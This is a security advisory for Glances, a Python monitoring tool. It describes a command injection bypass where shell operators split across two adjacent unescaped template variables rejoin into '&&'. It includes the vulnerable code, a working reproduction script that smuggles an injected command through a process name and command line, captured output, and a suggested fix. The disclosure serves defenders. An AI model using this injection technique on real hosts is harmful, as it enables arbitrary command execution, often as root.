# [H] Glances has a command injection bypass of action-template sanitizer via cross-field shell-operator reconstruction

## Summary
Severity: High
Advisory: GHSA-qcpp-8x79-hhp3
CVE: CVE-2026-68518
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-qcpp-8x79-hhp3
Type: github-advisory

## Affected
- PyPI: `glances` — affected >=0 <4.5.6

## Details
### Summary

The Glances action system lets an administrator configure shell commands that run
when a monitoring threshold is crossed. The command is a Mustache template whose
variables are filled with runtime stat fields such as a process name, a container
name or a filesystem mount point. Those fields are attacker-influenceable: a
local, unprivileged user who starts a process (or a container) controls its name
and command line. The rendered command is executed by `secure_popen()`, which
interprets `&&`, `|` and `>` as chaining / pipe / redirection operators.

`glances/actions.py` defends against this with `_sanitize_mustache_dict()`, which
strips those operators from **each individual** template value before rendering.
The sanitization is applied per field, but the operators are reconstructed
**across the boundary of two adjacent template variables** after Mustache
rendering. When an action template concatenates two unescaped variables
(`{{{a}}}{{{b}}}` or `{{&a}}{{&b}}`) and the attacker makes the first value end
with `&` and the second begin with `&`, the rendered command contains a real
`&&`, and `secure_popen()` executes the injected command. The single-`&` in each
value passes the per-field filter untouched.

### Affected versions

`glances` `<= 4.5.5` (verified against the published PyPI release `4.5.5`, the
latest at the time of writing; `glances.__version__ == "4.5.5"`). The
per-field sanitizer `_sanitize_mustache_dict()` is present and active in this
release. Not patched in any released version.

### Privilege required

Two roles are involved:

- A local, unprivileged user (or a container the attacker can name) supplies the
  attacker-controlled stat values (process/container name, mount point, etc.).
  This is the same trust boundary the action-template command-injection class
  already recognises: the attacker controls the process name, not the
  configuration.
- An administrator has configured an action whose command template concatenates
  two **unescaped** Mustache variables with no separating character
  (`{{{name}}}{{{cmdline}}}`). Unescaped Mustache (`{{{ }}}` / `{{& }}`) is a
  documented Chevron feature and is the natural choice when the operator wants a
  value that contains shell-significant characters to reach the command verbatim.

No network access to the target host is required beyond the ability to run a
process (or start a named container) on it.

### Vulnerable code (file:line)

`glances/actions.py:25-46` — the per-field sanitizer:

```python
# glances/actions.py:25
_SHELL_OPERATORS = ('&&', '|', '>>', '>')

def _sanitize_mustache_dict(mustache_dict):
    """Return a copy of mustache_dict with shell operators replaced by spaces."""
    if not mustache_dict:
        return mustache_dict
    safe = {}
    for k, v in mustache_dict.items():
        if isinstance(v, str):
            for op in _SHELL_OPERATORS:
                v = v.replace(op, ' ')          # per-field only
            safe[k] = v
        else:
            safe[k] = v
    return safe
```

`glances/actions.py:100-111` — sanitize-then-render-then-execute:

```python
# glances/actions.py:100
for cmd in commands:
    if chevron_tag:
        safe_dict = _sanitize_mustache_dict(mustache_dict)
        cmd_full = chevron.render(cmd, safe_dict)   # concatenation happens here
    else:
        cmd_full = cmd
    ret = secure_popen(cmd_full)                    # operators interpreted
```

### Root cause

`_sanitize_mustache_dict()` removes `&&`, `|`, `>>`, `>` from each value in
isolation. It does not remove a lone `&`, because a single `&` is not one of the
listed operators. When two values are rendered next to each other by
`chevron.render()`, a trailing `&` from the first value and a leading `&` from the
second value join into a literal `&&` in `cmd_full`. `secure_popen()` then
`cmd.split('&&')` and runs the second half as a separate `subprocess.Popen`
(`shell=False`) process. The same reconstruction works for `>` written as two
adjacent `>` characters split across the boundary (`...>` + `>...` and the
`>>`/`>` stripping is per field), and the sanitizer's own choice to sanitize
before, rather than after, rendering is the defect.

This is an incomplete fix of the action-template command-injection issue
(CVE-2026-32608 / GHSA-vcv2-q258-wrg7): `_sanitize_mustache_dict()` closes the
single-field case but not the cross-field-reconstruction case. The correct place
to enforce the operator ban is on the fully rendered command string (or by never
letting template-variable data introduce operators), not on the pre-render values
one at a time.

Chevron HTML-escapes `&`, `<`, `>`, `"` inside standard double-brace `{{ }}`
sections, so double-brace templates neutralise the `&&` reconstruction. The
reconstruction is reachable specifically through **unescaped** variables
(`{{{ }}}` / `{{& }}`), which is why the per-field sanitizer is the sole
remaining control on that path.

### Reachability / How input reaches sink

1. A local unprivileged user starts a process (or a container) whose `name`
   ends with `&` and whose `cmdline` begins with `& <command>` (both are stored
   verbatim in the plugin stat item).
2. When the plugin crosses a `warning` / `critical` threshold,
   `glances/plugins/plugin/model.py` calls `self.actions.run` with the full stat
   item passed as the `mustache_dict` argument.
3. `GlancesActions.run` sanitizes each value with `_sanitize_mustache_dict()`
   (each keeps its single `&`), then `chevron.render()` concatenates the two
   adjacent unescaped variables, producing a literal `&&` in the command string.
4. `secure_popen(cmd_full)` splits on `&&` and runs the attacker's segment as a
   separate `subprocess.Popen(shell=False)` process.

The trust boundary crossed is process-name / container-name → shell operator,
exactly the boundary the sanitizer was introduced to close.

### Reproduction (end-to-end, against pinned version `glances==4.5.5`)

```bash
# 1. Install the latest published release into a clean venv
python3.13 -m venv gv
./gv/bin/pip install "glances==4.5.5"

# 2. Run the reproducer, which drives the real
#    glances.actions.GlancesActions.run() pipeline exactly as
#    glances/plugins/plugin/model.py invokes it on an alert.
./gv/bin/python repro.py
```

`repro.py`:

```python
import os, sys, time
sys.argv = ['glances']
from glances.actions import GlancesActions

MARK = "/tmp/glances_crossfield_pwned"
NEG  = MARK + "_neg"
for f in (MARK, NEG):
    try: os.remove(f)
    except FileNotFoundError: pass

class Args:
    time = 0
ga = GlancesActions(args=Args())

# A processlist stat item; a local low-privilege user controls both 'name' and
# 'cmdline' by spawning a process (the established GHSA-vcv2 threat model).
# 'name' ends with '&', 'cmdline' begins with '&'  ->  '&&' forms across the boundary.
item = {'name': 'evilproc&', 'cmdline': '& touch %s' % MARK,
        'pid': 1337, 'cpu_percent': 99.0, 'key': 'pid'}

# NEGATIVE CONTROL: the same values under an ESCAPED double-brace template are
# neutralised by chevron HTML-escaping '&' -> '&amp;'.
neg_item = dict(item); neg_item['cmdline'] = '& touch %s' % NEG
ga.status.clear(); ga.start_timer._start = time.time() - 999
ga.run("pl", "CRITICAL", ["logger p={{name}}{{cmdline}}"], repeat=True, mustache_dict=neg_item)
time.sleep(0.3)
print("NEGATIVE CONTROL (escaped {{name}}{{cmdline}}):",
      "INJECTED" if os.path.exists(NEG) else "blocked (expected)")

# POSITIVE: an UNESCAPED template with two adjacent variables. Per-field
# _sanitize_mustache_dict leaves each single '&'; the '&&' operator is
# reconstructed after chevron.render, then split by secure_popen.
ga.status.clear(); ga.start_timer._start = time.time() - 999
ga.run("pl2", "CRITICAL", ["logger p={{{name}}}{{{cmdline}}}"], repeat=True, mustache_dict=item)
time.sleep(0.5)
print("POSITIVE (unescaped {{{name}}}{{{cmdline}}}):",
      "INJECTED - 'touch' executed" if os.path.exists(MARK) else "blocked")
```

Captured output (`glances` 4.5.5, Python 3.13, x86_64 Linux):

```
NEGATIVE CONTROL (escaped {{name}}{{cmdline}}): blocked (expected)
POSITIVE (unescaped {{{name}}}{{{cmdline}}}): INJECTED - 'touch' executed
```

The negative control confirms that the same attacker values under a standard
double-brace template are blocked (chevron escapes `&`). The positive case shows
the injected `touch` executing when the template uses two adjacent unescaped
variables: the file `/tmp/glances_crossfield_pwned` is created by the injected
command, not by the intended `logger` action.

### Impact

- Arbitrary command execution as the OS user running Glances (frequently root on
  monitored hosts) whenever an operator uses an unescaped, adjacent-variable
  action template and an attacker controls two neighbouring stat fields.
- The same reconstruction reaches `secure_popen()`'s file-redirection (`>`) and
  pipe (`|`) handling, allowing arbitrary file write and output piping in
  addition to command chaining.
- The bypass defeats the dedicated `_sanitize_mustache_dict()` control that was
  added specifically to stop attacker-controlled stat values from injecting shell
  operators.

### Suggested fix

Enforce the operator ban on the **rendered** command string that comes from
template-variable expansion, rather than on the pre-render values in isolation.
One approach that mirrors the existing helper: render each variable, then reject /
neutralise operators in the concatenated result, or strip lone `&`/redirection
characters that originate from variable data.

```python
def _sanitize_mustache_dict(mustache_dict):
    if not mustache_dict:
        return mustache_dict
    safe = {}
    for k, v in mustache_dict.items():
        if isinstance(v, str):
            # Neutralise every shell-significant character that secure_popen
            # can interpret, including a lone '&' that could pair with an
            # adjacent variable to reconstruct '&&'.
            for ch in ('&', '|', '>', '<'):
                v = v.replace(ch, ' ')
            safe[k] = v
        else:
            safe[k] = v
    return safe
```

Neutralising the single `&` (and the single `>` / `|`) in each value removes the
cross-field reconstruction because no operator character survives on either side
of a variable boundary. Alternatively, sanitize `cmd_full` after
`chevron.render()`, or pass the template-derived data as `secure_popen(...,
allow_operators=False)` when the command originates from stat-field substitution.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-qcpp-8x79-hhp3
- https://github.com/nicolargo/glances/commit/9c280eae5419da680827024b60f6265956e31994
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.6
